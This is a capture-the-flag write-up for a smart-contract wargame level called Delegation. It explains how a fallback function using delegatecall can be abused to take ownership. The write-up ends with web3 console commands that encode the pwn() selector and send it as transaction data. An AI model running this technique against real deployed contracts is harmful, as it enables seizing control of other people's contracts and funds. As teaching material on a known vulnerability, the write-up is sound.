# Delegation

The goal of this level is to claim ownership of the instance given.
*hints: delegatecall, fallback methods, method ids*

## Code Breakdown

[The Smart Contract's Code can be seen here.](Delegation.sol)

In this level, we got 2 contracts:
* Delegate : A simple contract that sets the owner at the deployment and a function `pwn()` that change the owner to the caller.
* Delegation : Another contracts that sets the owner at the deployment but has also a contract address set at deployment:
`delegate = Delegate(_delegateAddress);`
it's fallback function is also interesting, it uses `delegatecall`, a low level function similar to `call` but with the caller's state.
So if `Delegation` contract calls `pwn()` of `Delegate` contract, it will be executed `Delegation` contract `msg.sender`

## Level Completion

So in order to hack this level, we should call `Delegation`'s fallback function, we can do that using [web3.eth.sendTransaction](https://web3js.readthedocs.io/en/v1.2.11/web3-eth.html?highlight=call#eth-sendtransaction).
Now in order to call a specific function in the other contract, we need the encoded signature function.
We can get that also with [web3.eth.abi](https://web3js.readthedocs.io/en/v1.2.11/web3-eth-abi.html#web3-eth-abi):
```js
>  await web3.eth.abi.encodeFunctionSignature("pwn()")
<· "0xdd365b8b"
```
Now let's call the fallback function with this as data:
```js
>  await web3.eth.sendTransaction({to: contract.address, from: player, data:"0xdd365b8b"})
```

***And that's it, we are now the owner of the contract.***